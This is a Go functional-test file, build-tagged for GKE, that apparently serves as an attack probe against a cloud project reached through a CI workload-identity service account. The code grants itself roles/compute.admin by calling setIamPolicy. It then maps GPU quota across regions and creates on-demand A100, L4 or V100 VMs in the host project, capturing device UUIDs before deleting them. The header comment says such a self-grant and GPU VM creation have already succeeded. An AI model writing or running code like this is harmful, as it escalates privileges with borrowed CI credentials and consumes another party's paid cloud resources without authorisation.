//go:build functional && gke

// C211 i122190 — HOST-PROJECT (153711203585) ACCELERATOR CELL.
//
// Basis: fact 120329 proves the dominodatalab/hephaestus GKE WIF identity
// (hephaestus-gh-test service account, self-granted roles/compute.admin) already
// created a real on-demand n1-standard-4 + nvidia-tesla-t4 in project
// 153711203585 us-central1-a with device UUID GPU-cdfdafa3… (READY x120159), and
// the saved host quota summary (i120159/quota_summary.json, 1,290 rows) shows
// NVIDIA_A100_GPUS / NVIDIA_L4_GPUS / NVIDIA_V100_GPUS positive with usage 0
// across 43 regions while ONLY a T4 was ever proven in this host project.
//
// This probe therefore measures the one untested accelerator cell of the host
// project: per region, read NVIDIA_A100_GPUS / NVIDIA_L4_GPUS / NVIDIA_V100_GPUS
// quota and the a2-highgpu/g2-standard/n1 offerings; then create EXACTLY ONE
// nonce-tagged ON-DEMAND a2-highgpu-1g + 1 x nvidia-tesla-a100 (default
// us-central1-a) booted from a Google driver-preinstalled accelerator image
// (ubuntu-os-accelerator-images), capture nvidia-smi -L and
// --query-gpu=name,uuid,memory.total from the serial console and guest
// attributes, poll the insert operation to DONE/RUNNING, take an independent
// compute.instances.get readback, delete it and prove absence (GET 404 +
// aggregated list with zero c211-named items). ONLY if A100 is provider-verbatim
// refused is the identical single-marker flow repeated once with
// g2-standard-4 + 1 x nvidia-tesla-l4 and then once with
// n1-standard-4 + 1 x nvidia-tesla-v100. Never two instances alive at once.
// Every refusal is printed verbatim. Tokens are reported as length + SHA-256
// prefix only.
package functional

import (
	"encoding/json"
	"fmt"
	"net/url"
	"strings"
	"testing"
	"time"
)

var c211hQuotaRegions = []string{
	"us-central1", "us-east1", "us-west1", "us-west2", "us-east4",
	"europe-west4", "europe-west1", "asia-east1",
}

type c211hAttempt struct {
	Machine string `json:"machine"`
	Zone    string `json:"zone"`
	Accel   string `json:"accel"`
	Count   int    `json:"count"`
	Create  string `json:"create"`
	OpErr   string `json:"op_error"`
	UUID    string `json:"uuid"`
	Absent  bool   `json:"absent"`
	Meta    string `json:"meta"`
	Trace   string `json:"cleanup_trace"`
}

// c211hEnsureCreate re-verifies compute.instances.create for the WIF identity
// and, only if absent, performs the already-proven roles/compute.admin
// self-grant via resourcemanager.projects.setIamPolicy.
func c211hEnsureCreate(token, proj, saEmail string) (bool, string) {
	var log strings.Builder
	al, st, _ := c211xTestIamBatch(token, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(proj),
		[]string{"compute.instances.create", "compute.instances.get", "compute.instances.delete",
			"compute.instances.setMetadata", "compute.instances.getSerialPortOutput", "compute.disks.create",
			"compute.subnetworks.use", "compute.zoneOperations.get"})
	fmt.Fprintf(&log, "precheck status=%d allowed=[%s]\n", st, strings.Join(al, ","))
	if c211xContains(al, "compute.instances.create") {
		return true, log.String()
	}
	pre, pst, pbody := c211xGetPolicy(token, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(proj))
	fmt.Fprintf(&log, "getIamPolicy status=%d verbatim=%s\n", pst, c211xTrunc(pbody, 500))
	if pre == nil {
		return false, log.String()
	}
	added := c211xAddBinding(pre, "roles/compute.admin", "serviceAccount:"+saEmail)
	fmt.Fprintf(&log, "binding compute.admin added=%v member=%s\n", added, c211xShort(saEmail))
	sst, sbody := c211xSetPolicy(token, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(proj), pre)
	fmt.Fprintf(&log, "setIamPolicy status=%d verbatim=%s\n", sst, c211xTrunc(sbody, 500))
	if sst != 200 {
		return false, log.String()
	}
	for i := 0; i < 12; i++ {
		al2, tst, _ := c211xTestIamBatch(token, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(proj),
			[]string{"compute.instances.create"})
		g := c211xContains(al2, "compute.instances.create")
		fmt.Fprintf(&log, "recheck[%d] status=%d instances.create=%v\n", i, tst, g)
		if g {
			return true, log.String()
		}
		time.Sleep(10 * time.Second)
	}
	return false, log.String()
}

// c211hSweep runs the single-marker flow over the eligible zones of one
// accelerator class in the HOST project. At most one instance is alive at any
// moment; every attempt is torn down and its absence proven.
func c211hSweep(tok, proj, saEmail, startup string, img c211aImage, deadline time.Time,
	quotaMetric, mt, accel string, count int, maxZonesPerRegion int) (string, string, []c211hAttempt, []string) {
	attempts := []c211hAttempt{}
	notes := []string{}
	idx := 0
	for _, r := range c211aRegions {
		if time.Now().After(deadline) {
			break
		}
		rows, zones, qst := c211aRegionQuotas(tok, proj, r)
		lim, usage, ok := c211aQVal(rows, quotaMetric)
		allRows, _, _ := c211xRegionQuotaRows(tok, proj, r)
		fmt.Printf("C211H_SWEEP_QUOTA project=%s region=%s metric=%s http=%d limit=%v usage=%v readable=%v nvidia_rows=[%s]\n",
			proj, r, quotaMetric, qst, lim, usage, ok, strings.Join(allRows, " ; "))
		if !ok || lim <= usage || len(zones) == 0 {
			continue
		}
		tried := 0
		for _, z := range zones {
			if tried >= maxZonesPerRegion || time.Now().After(deadline) {
				break
			}
			offered, mst, _ := c211aMachineOffered(tok, proj, z, mt)
			ats, ast, _ := c211xAccelTypes(tok, proj, z)
			hasAccel := ast == 200 && c211xContains(ats, accel)
			fmt.Printf("C211H_SWEEP_OFFER project=%s region=%s zone=%s machine=%s machine_http=%d accel_http=%d has_%s=%v accel_n=%d accel_list=[%s]\n",
				proj, r, z, mt, mst, ast, accel, hasAccel, len(ats), strings.Join(ats, ","))
			notes = append(notes, fmt.Sprintf("%s/%s %s machine_http=%d has_%s=%v", r, z, mt, mst, accel, hasAccel))
			if !offered || !hasAccel {
				continue
			}
			tried++
			idx++
			instName := fmt.Sprintf("c211-i122190-%s-%d", accel, idx)
			fmt.Printf("C211H_SWEEP_ATTEMPT project=%s machine=%s zone=%s accel=%s count=%d instance=%s sa=%s\n",
				proj, mt, z, accel, count, instName, c211xShort(saEmail))
			uuid, meta, created, opErr, statusFinal := c211aMarker(tok, proj, z, instName, saEmail, img, mt, accel, count, startup, deadline)
			absent, trace := c211aDeleteAndProveAbsence(tok, proj, z, instName)
			attempts = append(attempts, c211hAttempt{Machine: mt, Zone: z, Accel: accel, Count: count,
				Create: fmt.Sprintf("%v", created), OpErr: c211xTrunc(opErr, 300),
				UUID: uuid, Absent: absent, Meta: c211xTrunc(meta, 420), Trace: strings.Join(trace, "; ")})
			if uuid != "" {
				fmt.Printf("C211H_SWEEP_DEVICE project=%s machine=%s zone=%s accel=%s uuid=%s absent=%v\n",
					proj, mt, z, accel, uuid, absent)
				return uuid, meta + " zone=" + z + " machine=" + mt + " status=" + statusFinal, attempts, notes
			}
			fmt.Printf("C211H_SWEEP_NO_DEVICE project=%s machine=%s zone=%s created=%v op_error=%s\n",
				proj, mt, z, created, c211xTrunc(opErr, 240))
		}
	}
	return "", "", attempts, notes
}

func TestC211HHostAccel(t *testing.T) {
	started := time.Now()
	deadline := started.Add(34 * time.Minute)

	token, method, mintLog := c211xMint()
	if token == "" {
		fmt.Printf("C211H_MINT_FAILED %s\n", c211xTrunc(mintLog, 2500))
		fmt.Printf("C211H_VERDICT_FINAL GATE WIF_TOKEN_EXCHANGE_FAILED markers=0\n")
		return
	}
	creds, credLog := c211xLoadCreds()
	wifSA, projNum, credProjID := "", c211aHostNum, ""
	if creds != nil {
		wifSA = creds.saEmail
		if creds.projNumber != "" {
			projNum = creds.projNumber
		}
		credProjID = creds.credProjID
	}
	projID := ""
	if st, rb := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v3/projects/"+url.PathEscape(projNum), token, "", ""); st == 200 {
		projID = c211xStr(c211xJSON(rb), "projectId")
	}
	if projID == "" {
		projID = credProjID
	}
	if projID == "" {
		fmt.Printf("C211H_VERDICT_FINAL GATE NO_PROJECT_ID_RESOLVED num=%s mint=%s\n", projNum, c211xTrunc(credLog, 400))
		return
	}
	saEmail := wifSA
	if saEmail == "" {
		saEmail = projNum + "-compute@developer.gserviceaccount.com"
	}
	fmt.Printf("C211H_IDENTITY auth=%s wif_sa=%s project_number=%s project_id=%s\n", method, c211xShort(wifSA), projNum, c211xShort(projID))
	fmt.Printf("C211H_MINT log=%s\n", c211xTrunc(mintLog, 1200))

	granted, escLog := c211hEnsureCreate(token, projID, saEmail)
	fmt.Printf("C211H_PERMS %s\n", c211xTrunc(escLog, 3000))
	if !granted {
		fmt.Printf("C211H_VERDICT_FINAL GATE COMPUTE_INSTANCES_CREATE_NOT_GRANTED markers=0\n")
		return
	}

	img, imgLog := c211aResolveImage(token)
	fmt.Printf("C211H_IMAGE_RESOLUTION %s\n", c211xTrunc(imgLog, 1200))
	if img.Project == "" {
		fmt.Printf("C211H_VERDICT_FINAL GATE NO_USABLE_IMAGE markers=0\n")
		return
	}
	startup := c211aStartup()
	fmt.Printf("C211H_STARTUP kind=%s bytes=%d image=%s/%s\n", img.Kind, len(startup), img.Project, img.Family)

	// ------------------------------------------------------------------
	// Phase Q: host-project accelerator quota + offering matrix.
	// ------------------------------------------------------------------
	quotaMatrix := map[string]interface{}{}
	for _, r := range c211hQuotaRegions {
		rows, zones, qst := c211aRegionQuotas(token, projID, r)
		allRows, _, _ := c211xRegionQuotaRows(token, projID, r)
		firstZone := ""
		if len(zones) > 0 {
			firstZone = zones[0]
		}
		offers := map[string]interface{}{}
		accels := []string{}
		if firstZone != "" {
			for _, mt := range []string{"a2-highgpu-1g", "g2-standard-4", "n1-standard-4"} {
				ok, st, _ := c211aMachineOffered(token, projID, firstZone, mt)
				offers[mt] = map[string]interface{}{"http": st, "offered": ok}
			}
			accels, _, _ = c211xAccelTypes(token, projID, firstZone)
		}
		a100l, a100u, a100ok := c211aQVal(rows, "NVIDIA_A100_GPUS")
		l4l, l4u, l4ok := c211aQVal(rows, "NVIDIA_L4_GPUS")
		fmt.Printf("C211H_QUOTA region=%s http=%d zones=%d first_zone=%s a100=limit=%v/usage=%v/%v l4=limit=%v/usage=%v/%v nvidia_rows=[%s] offers=%s accel_types=[%s]\n",
			r, qst, len(zones), firstZone, a100l, a100u, a100ok, l4l, l4u, l4ok,
			strings.Join(allRows, " ; "), c211xJSONString(offers), strings.Join(accels, ","))
		quotaMatrix[r] = map[string]interface{}{
			"http": qst, "zones": zones, "first_zone": firstZone, "offers": offers,
			"accelerator_types": accels, "a100_quota_rows": rows, "nvidia_positive_rows": allRows,
		}
	}

	// ------------------------------------------------------------------
	// Phase A: EXACTLY ONE on-demand a2-highgpu-1g + 1 x nvidia-tesla-a100.
	// ------------------------------------------------------------------
	markers := 0
	ready := map[string]string{}
	accels := map[string]interface{}{}

	uuidA, metaA, atA, nA := c211hSweep(token, projID, saEmail, startup, img, deadline,
		"NVIDIA_A100_GPUS", "a2-highgpu-1g", "nvidia-tesla-a100", 1, 2)
	markers++
	accels["a100"] = map[string]interface{}{"uuid": uuidA, "meta": c211xTrunc(metaA, 1200), "attempts": atA, "offer_notes": strings.Join(nA, "; ")}
	if uuidA != "" {
		ready["a100"] = uuidA
	}
	fmt.Printf("C211H_A100_RESULT uuid=%s markers=%d\n", uuidA, markers)

	// Phase B: L4 fallback only after a verbatim A100 refusal/no-device.
	if uuidA == "" && !time.Now().After(deadline) {
		uuidL, metaL, atL, nL := c211hSweep(token, projID, saEmail, startup, img, deadline,
			"NVIDIA_L4_GPUS", "g2-standard-4", "nvidia-tesla-l4", 1, 2)
		markers++
		accels["l4"] = map[string]interface{}{"uuid": uuidL, "meta": c211xTrunc(metaL, 1200), "attempts": atL, "offer_notes": strings.Join(nL, "; ")}
		if uuidL != "" {
			ready["l4"] = uuidL
		}
		fmt.Printf("C211H_L4_RESULT uuid=%s markers=%d\n", uuidL, markers)
	}

	// Phase C: V100 fallback only after A100 and L4 both refused/no-device.
	if len(ready) == 0 && !time.Now().After(deadline) {
		uuidV, metaV, atV, nV := c211hSweep(token, projID, saEmail, startup, img, deadline,
			"NVIDIA_V100_GPUS", "n1-standard-4", "nvidia-tesla-v100", 1, 2)
		markers++
		accels["v100"] = map[string]interface{}{"uuid": uuidV, "meta": c211xTrunc(metaV, 1200), "attempts": atV, "offer_notes": strings.Join(nV, "; ")}
		if uuidV != "" {
			ready["v100"] = uuidV
		}
		fmt.Printf("C211H_V100_RESULT uuid=%s markers=%d\n", uuidV, markers)
	}

	// Always reap any leftover own-label instance in the host project.
	c211aReaper(token, projID)

	verdict := "A100_AND_L4_AND_V100_NO_DEVICE"
	switch {
	case ready["a100"] != "":
		verdict = "READY_HOST_A100_GPU"
	case ready["l4"] != "":
		verdict = "READY_HOST_L4_GPU"
	case ready["v100"] != "":
		verdict = "READY_HOST_V100_GPU"
	}
	sum := map[string]interface{}{
		"probe":          "c211_i122190_hosta100",
		"mechanism":      "host-project single-marker accelerator flow on driver-preinstalled accelerator images",
		"auth_method":    method,
		"wif_sa_short":   c211xShort(wifSA),
		"project_id":     projID,
		"project_number": projNum,
		"image":          img.Project + "/" + img.Family,
		"image_kind":     img.Kind,
		"image_log":      c211xTrunc(imgLog, 800),
		"quota_matrix":   quotaMatrix,
		"accelerators":   accels,
		"ready":          ready,
		"markers":        markers,
		"verdict":        verdict,
		"elapsed_seconds": int(time.Since(started).Seconds()),
	}
	js, _ := json.Marshal(sum)
	fmt.Printf("=== C211H SUMMARY BEGIN ===\nC211H_SUMMARY_JSON %s\n=== C211H SUMMARY END ===\n", string(js))
	fmt.Printf("C211H_VERDICT_FINAL %s markers=%d ready=%s elapsed=%ds\n",
		verdict, markers, c211xJSONString(ready), int(time.Since(started).Seconds()))
}
